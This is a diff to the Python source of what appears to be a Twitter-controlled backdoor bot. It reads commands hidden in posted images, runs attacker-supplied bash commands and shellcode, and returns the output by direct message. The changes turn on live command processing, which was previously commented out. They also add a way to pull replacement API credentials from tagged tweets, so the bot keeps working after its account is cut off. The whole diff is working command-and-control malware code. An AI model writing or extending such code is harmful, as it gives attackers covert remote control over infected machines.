@@ -50,8 +50,10 @@ def verify_api():
     try:
         api.VerifyCredentials()
         print("Twitter credentials are valid.")
+        return True
     except twitter.error.TwitterError as exc:
-        sys.exit("Error: Couldn't authenticate with Twitter.")
+        print("Error: Couldn't authenticate with Twitter.")
+        return False
 
 def get_secret(image):
     # reveal hidden message in the image
@@ -91,14 +93,31 @@ def run_bash_command(bash_command_str, to):
     print("Executing bash command: " + bash_command_str)
     proc = subprocess.Popen(bash_command_str, shell=True, stdout=subprocess.PIPE)
     output = proc.stdout.read()
-    print("Sending output: \n" + output + "\nto: " + to)
-    api.PostDirectMessage(text=output, user_id=to)
+    if(to is not None and to > 0):
+        print("Sending output: \n" + output + "\nto: " + to)
+        api.PostDirectMessage(text=output, user_id=to)
+
+def check_new_creds(yaml_conf):
+    global api, conf
+    conf = yaml.load(yaml_conf)
+    
+    stream = file('conf.yaml', 'w')
+    yaml.dump(conf, stream, default_flow_style = False)
+
+    # reload api with new creds
+    print("API Credentials changed.")
+    api = twitter.Api(consumer_key=conf['twitter']['consumer_key'], 
+    consumer_secret=conf['twitter']['consumer_secret'], 
+    access_token_key=conf['twitter']['access_token_key'], 
+    access_token_secret=conf['twitter']['access_token_secret'])
 
 def meow_operation(operation_mode, operation_payload, sender):
     if (operation_mode == "SHELL_CODE"):
         run_shellcode(operation_payload)
     elif (operation_mode == "BASH_COMMAND"):
         run_bash_command(operation_payload, sender)
+    elif (operation_mode == "NEW_CREDS"):
+        check_new_creds(operation_payload)
 
 def get_cmds():
     print("Searching for hashtag: " + conf['id'])
@@ -158,15 +177,22 @@ def get_new_creds():
         'Connection': 'Keep-Alive'
     }
 
-    url = "https://twitter.com/search?q=%230fb8539d64f0899d2b0552fd2dde5328f5494d3a1bbad3dbcdbeafbb73c1fae4"
+    url = "https://twitter.com/search?f=tweets&q=%23NEW_CREDENTIALS%20%23" + conf["id"]
 
+    print("Searching for new credentials...")
     response = requests.get(url, headers=headers)
     content = response.text.encode('utf-8').strip()
 
-    pattern = re.compile(r'(https:\/\/pbs\.twimg\.com\/media\/[\w]*\.png)')
+    pattern = re.compile(r'(https:\/\/pbs\.twimg\.com\/media\/.*\.png)')
 
     for (image_url) in re.findall(pattern, content):
-        print image_url
+        # FIX ME
+        tweet = twitter.models.Status()
+        tweet.user = twitter.models.User()
+        tweet.user.id = 0
+        tweet.media = [twitter.models.Media()]
+        tweet.media[0].media_url_https = image_url
+        process_tweet(tweet)
 
 def main(argv):
     # Main 
@@ -176,17 +202,18 @@ def main(argv):
     while True:
         # Verify API Credentials
         if((time.time() - last_api_cred_check) > conf["api_cred_ttl"]):
-            verify_api()
+            if(verify_api()):
+                last_api_cred_check = time.time()
+            else:
+                get_new_creds()
+        else:
+            # Get last C&C tweet
+            cmd_tweet = get_last_cmd()
 
-        # Get last C&C tweet
-        cmd_tweet = get_last_cmd()
-
-        if(cmd_tweet):
-            #process_tweet(cmd_tweet)
-            print "processing cmd..."
+            if(cmd_tweet):
+                process_tweet(cmd_tweet)
 
         time.sleep(random.randint(conf["min_idle_secs"], conf["max_idle_secs"]))
-
 
 if __name__ == "__main__":
     main(sys.argv)
